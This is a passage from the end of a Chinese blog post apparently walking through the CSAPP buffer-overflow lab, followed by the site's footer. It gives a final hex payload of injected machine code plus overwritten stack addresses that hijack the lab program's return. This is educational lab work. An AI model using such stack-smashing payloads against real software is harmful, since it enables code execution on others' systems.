+<p>​	仍用之前的办法将攻击指令转为二进制代码，这次代码长度变短，正好11个字节，再放入<code class="language-plaintext highlighter-rouge">0xffffb898</code> 和攻击代码的起始地址。大功告成：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>b8 fe 0b dd 46 68 1e 90 04 08 c3 00 98 b8 ff ff 6c b8 ff ff
+</code></pre></div></div>
+
+<p><img src="/assets/img/CSAPP/lab3/11.png" alt=""></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> tag: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#csapp" class="page__taxonomy-item" rel="tag">CSAPP</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#stackoverflow" class="page__taxonomy-item" rel="tag">StackOverflow</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> category: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#csapp" class="page__taxonomy-item" rel="tag">CSAPP</a>
+    
+    </span>
+  </p>
+
+
+        
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> update time:</strong> <time datetime="2021-05-27T00:00:00+08:00">May 27, 2021</time></p>
+
+
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">share</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?text=%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E7%82%B8%E5%BC%B9%E5%AE%9E%E9%AA%8C%20http%3A%2F%2Flocalhost%3A4000%2Fcsapp%2F2021%2F05%2F27%2FCSAPPLab03.html" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="share Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fcsapp%2F2021%2F05%2F27%2FCSAPPLab03.html" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="share Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http%3A%2F%2Flocalhost%3A4000%2Fcsapp%2F2021%2F05%2F27%2FCSAPPLab03.html" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="share LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/csapp/2021/05/26/CSAPPLab02.html" class="pagination--pager" title="深入理解计算机系统之二进制炸弹实验
+">previous</a>
+    
+    
+      <a href="/csapp/2021/06/29/CSAPPLab04.html" class="pagination--pager" title="深入理解计算机系统之代码优化实验
+">next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">related</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/img/teaser.jpg" alt="">
+      </div>
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/cpp/2022/03/08/gem5-2.html" rel="permalink">深入理解 Gem5 之二
+</a>
+      
+    </h2>
+    
+      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  6 minutes read
+
+</p>
+    
+    <p class="archive__item-excerpt" itemprop="description">关于gem5中序列化等实现
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/img/teaser.jpg" alt="">
+      </div>
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/cpp/2022/02/24/gem5-1.html" rel="permalink">深入理解 Gem5 之一
+</a>
+      
+    </h2>
+    
+      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  7 minutes read
+
+</p>
+    
+    <p class="archive__item-excerpt" itemprop="description">关于gem5事件的实现
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/img/teaser.jpg" alt="">
+      </div>
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/cpp/2021/11/15/Qt-signal-slot.html" rel="permalink">信号槽机制的简陋实现
+</a>
+      
+    </h2>
+    
+      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  4 minutes read
+
+</p>
+    
+    <p class="archive__item-excerpt" itemprop="description">
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/img/teaser.jpg" alt="">
+      </div>
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/mpi&amp;openmp/2021/10/20/cuda-with-matmul.html" rel="permalink">CUDA 中的矩阵乘
+</a>
+      
+    </h2>
+    
+      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  3 minutes read
+
+</p>
+    
+    <p class="archive__item-excerpt" itemprop="description">动手书写 CUDA 核函数
+</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap">
+<form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="输入您要搜索的关键词...">
+  </form>
+  <div id="results" class="results"></div>
+</div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>follow:</strong></li>
+    
+
+    
+      
+        
+          <li><a href="https://github.com/dingfen" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> Github</a></li>
+        
+      
+        
+          <li><a href="df12138@mail.ustc.edu.cn" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i> Email</a></li>
+        
+      
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">© 2022 Bill Ding. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+    
+  <script>
+    var disqus_config = function () {
+      this.page.url = "http://localhost:4000/csapp/2021/05/27/CSAPPLab03.html";  /* Replace PAGE_URL with your page's canonical URL variable */
+      this.page.identifier = "/csapp/2021/05/27/CSAPPLab03"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */
+    };
+    (function() { /* DON'T EDIT BELOW THIS LINE */
+      var d = document, s = d.createElement('script');
+      s.src = 'https://https://dingfen.github.io/.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+</noscript>
+
+
+  
+
+
+
+
+
+  </body>
+</html>
